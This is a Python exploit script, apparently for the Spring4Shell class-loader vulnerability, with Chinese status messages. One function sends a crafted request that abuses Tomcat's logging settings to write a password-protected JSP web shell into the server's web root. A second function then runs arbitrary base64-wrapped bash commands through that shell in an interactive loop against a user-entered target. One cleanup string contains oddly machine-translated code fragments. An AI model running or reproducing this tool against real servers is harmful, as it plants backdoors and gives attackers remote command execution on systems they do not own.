#! usr/bin/env python3
#  writer: yueji0j1anke

import requests
import colorama
import base64

def attack(target):
    url = 'http://{}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=yuejinjianke&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format(target)
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Connection': 'close',
        'suffix': '%>//',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1'
    }
    try:
        response = requests.get(url,headers=headers)
    except Exception as e:
        print(colorama.Fore.RED + '[error] 发生故障: {}'.format(e))

    if response.status_code == 200:
        print(colorama.Fore.GREEN + '[info] 植入木马成功')
        return True
    else:
        print(response.text)
        print(colorama.Fore.RED + '[error] 植入木马失败')
        return False

def exploit(cmd,target):
    cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    cmd = 'bash -c {echo,'+ cmd +'}|{base64,-d}|{bash,-i}'
    url = 'http://{}/yuejinjianke.jsp?pwd=j&cmd={}'.format(target,cmd)
    print(url)
    try:
        response = requests.get(url)
    except Exception as e:
        print(colorama.Fore.RED + '[error] 发生故障: {}'.format(e))
    if response.status_code == 200:
        print(colorama.Fore.GREEN + '[info] 命令执行成功')
        print('\n')
        print(colorama.Fore.BLUE + '[info] 命令回显如下:' + response.text.replace('- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime ().exec(request.getParameter("cmd")).getInputStream();整数a=-1； byte[] b = 新字节[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -', ''))
    else:
        print(colorama.Fore.RED + '[error] 命令执行失败')

if __name__ == '__main__':
    target = input("请输入你的攻击目标: ")
    OK = attack(target)
    if OK:
        while True:
            cmd = input("请输入你要执行的cmd: ")
            exploit(cmd,target)
    else:
        print(colorama.Fore.RED + '[error] 请仔细检查url或者网站是否存在漏洞')
